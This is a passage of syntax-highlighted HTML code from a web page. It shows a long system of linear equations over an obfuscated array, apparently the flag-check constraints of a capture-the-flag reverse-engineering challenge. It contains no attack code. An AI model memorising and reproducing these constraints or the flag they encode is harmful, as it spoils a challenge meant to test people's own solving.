class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">150</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">166</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">126</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">690</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">207</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">46</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">12591</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">160</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">690</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">46</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">52041</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">46</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">20253</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">45</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">650</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">900</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">44</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">406</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">651</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">18768</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">555</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">70</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">510</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">499</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">610</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">221</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">102</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2050</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">406</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">665</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">201</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">111844</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4444</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5555</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">676</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">660</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">73</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">107</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">201</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">159029</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">520</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">222</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56655</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">220</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">73</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1007</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2500</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">605</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">390</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99999</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">210</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">232</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2762025</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">1323</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token 